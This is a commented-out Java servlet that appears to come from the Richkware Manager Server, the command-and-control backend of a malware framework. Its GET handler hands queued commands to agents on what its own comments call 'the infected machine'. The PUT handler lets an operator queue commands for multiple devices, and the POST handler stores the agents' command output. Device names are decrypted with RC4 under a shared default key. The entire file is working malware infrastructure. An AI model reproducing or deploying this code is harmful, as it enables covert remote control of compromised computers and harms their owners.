//package it.richkmeli.rms.web.v1;
//
//import it.richkmeli.jframework.auth.data.exception.AuthDatabaseException;
//import it.richkmeli.jframework.auth.web.util.AuthServletManager;
//import it.richkmeli.jframework.crypto.Crypto;
//import it.richkmeli.jframework.network.tcp.server.http.payload.response.KoResponse;
//import it.richkmeli.jframework.network.tcp.server.http.payload.response.OkResponse;
//import it.richkmeli.jframework.network.tcp.server.http.util.JServletException;
//import it.richkmeli.rms.web.util.RMSServletManager;
//import it.richkmeli.rms.web.util.RMSSession;
//import it.richkmeli.rms.web.util.RMSStatusCode;
//import org.json.JSONArray;
//import org.json.JSONException;
//import org.json.JSONObject;
//
//import javax.servlet.annotation.WebServlet;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.io.BufferedReader;
//import java.io.IOException;
//import java.util.*;
//
//@WebServlet(
//        name = "command",
//        description = "",
//        urlPatterns = {"/command", "/Richkware-Manager-Server/command"}
//)
//public class command extends HttpServlet {
//    private String password;
//
//    public command() {
//        super();
//        password = ResourceBundle.getBundle("configuration").getString("encryptionkey");
//    }
//
//    /**
//     * GET
//     * Richkware Agent use this verb to get commands that have to be executed on the
//     * infected machine.
//     * Webapp and RMC use this verb to get command outputs
//     *
//     * @param request
//     * @param response
//     * @throws IOException
//     */
//
//    @Override
//    protected void doGet(HttpServletRequest request, HttpServletResponse response) {
//        try {
//            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
//            // _TODO il cookie non deve essere controllato se è un richkware agent, negli altri casi si
//            Map<String, String> attribMap = rmsServletManager.doDefaultProcessRequest(false);
//
//            // server session
//            RMSSession rmsSession = rmsServletManager.getRMSServerSession();
//
//            String deviceName = attribMap.get("data0");
//
//            String output = null;
//
//            if (RMSServletManager.Channel.RICHKWARE.equalsIgnoreCase(rmsSession.getChannel())) {
//                // get the deviceName decrypting with the default key
//                deviceName = Crypto.decryptRC4(deviceName, password);
//                output = rmsSession.getDeviceDatabaseManager().getCommands(deviceName);
//                rmsSession.getDeviceDatabaseManager().editCommands(deviceName,"");
//                // _TODO return the commands to be executed encrypted with the specific key of that device
//                //output = Crypto.encryptRC4(output,rmsSession.getDeviceDatabaseManager().getEncryptionKey(deviceName));
//            } else {
//                output = rmsSession.getDeviceDatabaseManager().getCommandsOutput(deviceName);
//                output = rmsServletManager.doDefaultProcessResponse(output);
//            }
//            if (!output.isEmpty()) {
//                AuthServletManager.print(response, new OkResponse(RMSStatusCode.SUCCESS, output));
//            } else {
//                AuthServletManager.print(response, new KoResponse(RMSStatusCode.DB_FIELD_EMPTY));
//            }
//        } catch (AuthDatabaseException e) {
//            AuthServletManager.print(response, new KoResponse(RMSStatusCode.DB_ERROR, e.getMessage()));
//        } catch (Exception e) {
//            AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage()));
//        }
//    }
//
//    /**
//     * PUT
//     * Webapp and RMC upload commands that have to be executed on a specific device
//     *
//     * @param request
//     * @param response
//     * @throws IOException
//     */
//    @Override
//    protected void doPut(HttpServletRequest request, HttpServletResponse response) {
//        // _TODO: gestire richieste per multipli device
//
//        try {
//            BufferedReader br = request.getReader();
//            String data = br.readLine();
//            JSONObject JSONData = new JSONObject(data);
//            JSONArray devicesName = JSONData.getJSONArray("devices");
//            String commands = JSONData.getString("commands");
//
//            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
//            RMSSession rmsSession = rmsServletManager.getRMSServerSession();
//
//            List<String> failedResponse = new ArrayList<>();
//            for (Object device : devicesName) {
//                if (!rmsSession.getDeviceDatabaseManager().editCommands((String) device, commands)) {
//                    failedResponse.add((String) device);
//                }
//            }
//
//            if (failedResponse.isEmpty())
//                AuthServletManager.print(response, new OkResponse(RMSStatusCode.SUCCESS, "commands added."));
//            else {
//                AuthServletManager.print(response, new KoResponse(RMSStatusCode.DB_FIELD_EMPTY, Arrays.toString(failedResponse.toArray())));
//            }
//
//            br.close();
//        } catch (JServletException | JSONException | AuthDatabaseException | IOException e) {
//            AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage()));
//        }
//    }
//
//    /**
//     * POST
//     * Richkware Agent use this verb to upload the command outputs of the command sent before by
//     * webapp or RMC with verb PUT
//     *
//     * @param request
//     * @param response
//     * @throws IOException
//     */
//    @Override
//    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
//
//        try {
//            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
//            Map<String, String> attribMap = rmsServletManager.doDefaultProcessRequest(false);
//
//            // server session
//            RMSSession rmsSession = rmsServletManager.getRMSServerSession();
//
//            // device: deviceID
//            // data: command outputs
//            if (attribMap.containsKey("device") &&
//                    attribMap.containsKey("data")) {
//
//                String deviceName = attribMap.get("device");
//                String commandsOutput = attribMap.get("data");
//
//                //commandsOutput = Crypto.decryptRC4(commandsOutput, password);
//                //commandsOutput= new String(Base64.getUrlDecoder().decode(commandsOutput));
//                // Reverse command output has to be sent to the front end in base64 format
//
//                boolean result = rmsSession.getDeviceDatabaseManager().setCommandsOutput(deviceName, commandsOutput);
//                if (result) {
//                    rmsSession.getDeviceDatabaseManager().editCommands(deviceName, "");
//                    AuthServletManager.print(response, new OkResponse(RMSStatusCode.SUCCESS, "editCommands succeeded"));
//                } else {
//                    AuthServletManager.print(response, new KoResponse(RMSStatusCode.DB_FIELD_EMPTY, "Field not found in DB"));
//                }
//            } else {
//                // argomenti non presenti
//                AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, "Parameters missing"));
//            }
//        } catch (JServletException e) {
//            AuthServletManager.print(response, e.getResponse());
//        } catch (AuthDatabaseException e) {
//            AuthServletManager.print(response, new KoResponse(RMSStatusCode.DB_ERROR, e.getMessage()));
//        } catch (Exception e) {
//            //e.printStackTrace();
//            AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage()));
//        }
//
//    }
//
//}
